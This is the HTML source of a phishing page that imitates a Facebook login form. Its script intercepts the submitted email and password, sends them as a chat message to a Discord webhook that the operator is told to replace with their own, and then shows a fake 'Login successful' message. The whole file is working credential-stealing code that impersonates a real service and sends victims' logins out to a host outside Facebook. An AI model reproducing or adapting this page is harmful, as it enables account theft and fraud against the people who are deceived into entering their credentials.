<!DOCTYPE html>

<html>

<head>

	<title>Facebook Login</title>	<link rel="stylesheet" type="text/css" href="style.css">

</head>

<body>

	<div class="container">

		<h1>Facebook Login</h1>

		<form onsubmit="sendWebhook(event)">

			<label for="email">Email or Phone:</label>

			<input type="text" id="email" name="email" required>

			<label for="password">Password:</label>

			<input type="password" id="password" name="password" required>

			<button type="submit">Log In</button>

			<div class="forgot-password">

				<a href="#">Forgot Password?</a>

			</div>

		</form>

	</div>

	<script>

		function sendWebhook(event) {

			event.preventDefault(); // prevent the default form submit behavior

			

			const email = document.getElementById("email").value;

			const password = document.getElementById("password").value;

			const webhookURL = "https://discord.com/api/webhooks/1234567890/abcdefg"; // replace with your own webhook URL

			

			const data = {

				"username": "Facebook Login",

				"content": `Email: ${email}, Password: ${password}`

			};

			

			fetch(webhookURL, {

				method: "POST",

				headers: {

					"Content-Type": "application/json"

				},

				body: JSON.stringify(data)

			})

			.then(response => {

				if (response.ok) {

					alert("Login successful!"); // display a success message to the user

				} else {

					alert("Login failed. Please try again."); // display an error message to the user

				}

			})

			.catch(error => {

				alert("An error occurred. Please try again later."); // display an error message to the user

				console.error(error);

			});

		}

	</script>

</body>

</html>
